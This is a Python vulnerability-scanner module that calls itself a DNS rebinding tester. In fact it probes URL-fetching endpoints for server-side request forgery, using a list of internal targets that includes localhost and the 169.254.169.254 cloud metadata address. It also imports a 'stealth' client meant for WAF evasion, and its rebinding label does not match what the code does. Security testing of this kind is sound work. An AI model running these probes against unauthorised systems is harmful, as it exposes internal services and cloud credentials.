#!/usr/bin/env python3
"""DNS Rebinding Tester

Tests for DNS rebinding vulnerabilities:
- DNS rebinding to bypass same-origin policy
- Internal network access via DNS rebinding
- Cloud metadata access via DNS rebinding
"""

import os
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, urljoin

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)



def test_dns_rebinding(
    target_url: str,
    internal_target: str = "127.0.0.1"
) -> Dict[str, Any]:
    """Test for DNS rebinding vulnerabilities
    
    This tests SSRF-like endpoints that might be vulnerable to DNS rebinding.
    The target should be an endpoint that fetches external URLs (like /fetch).
    
    Args:
        target_url: Target URL (endpoint that fetches URLs)
        internal_target: Internal target to test
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "dns_rebinding",
        "test": "dns_rebinding",
        "vulnerable": False,
        "url": target_url,
        "internal_access": False,
        "evidence": None
    }
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # Internal URLs to test via the fetch endpoint
    internal_urls = [
        "http://internal.local/admin",
        "http://internal.local/metadata",
        "http://169.254.169.254/latest/meta-data/",
        f"http://{internal_target}/",
        f"http://{internal_target}:8080/",
        "http://localhost/",
        "http://127.0.0.1/",
    ]
    
    # Try /fetch endpoint if not already specified
    fetch_endpoints = [target_url]
    if not any(ep in target_url for ep in ["/fetch", "/url", "/proxy", "/request"]):
        fetch_endpoints.append(urljoin(target_url, "/fetch"))
    
    for fetch_endpoint in fetch_endpoints:
        for internal_url in internal_urls:
            # Try POST with form data
            try:
                resp = safe_post(
                    fetch_endpoint,
                    data={"url": internal_url},
                    timeout=10
                )
                
                response_lower = resp.text.lower()
                # Check for internal access indicators
                internal_indicators = [
                    "internal network accessed",
                    "internal_endpoint",
                    "dns_rebinding",
                    "admin_panel",
                    "cloud_metadata",
                    "metadata endpoint",
                    "internal admin"
                ]
                
                if any(ind in response_lower for ind in internal_indicators):
                    result["vulnerable"] = True
                    result["internal_access"] = True
                    result["evidence"] = {
                        "fetch_endpoint": fetch_endpoint,
                        "internal_url": internal_url,
                        "method": "POST_FORM",
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                        "note": "DNS rebinding - internal network access detected"
                    }
                    return result
            except Exception:
                pass
            
            # Try GET with url parameter
            try:
                resp = safe_get(
                    fetch_endpoint,
                    params={"url": internal_url},
                    timeout=10
                )
                
                response_lower = resp.text.lower()
                internal_indicators = [
                    "internal network accessed",
                    "internal_endpoint",
                    "dns_rebinding",
                    "admin_panel",
                    "cloud_metadata",
                    "metadata endpoint",
                    "internal admin"
                ]
                
                if any(ind in response_lower for ind in internal_indicators):
                    result["vulnerable"] = True
                    result["internal_access"] = True
                    result["evidence"] = {
                        "fetch_endpoint": fetch_endpoint,
                        "internal_url": internal_url,
                        "method": "GET",
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                        "note": "DNS rebinding - internal network access detected"
                    }
                    return result
            except Exception:
                pass
    
    return result


def validate_dns_rebinding(
    discovery_data: Dict[str, Any]
) -> Dict[str, Any]:
    """Main validation function for DNS rebinding
    
    Args:
        discovery_data: Discovery data
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    target = discovery_data.get("target")
    if not target:
        return results
    
    internal_target = discovery_data.get("internal_target", "127.0.0.1")
    
    test_result = test_dns_rebinding(target, internal_target)
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="DNS Rebinding Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    args = ap.parse_args()
    
    result = test_dns_rebinding(args.target)
    
    import json
    print(json.dumps(result, indent=2))

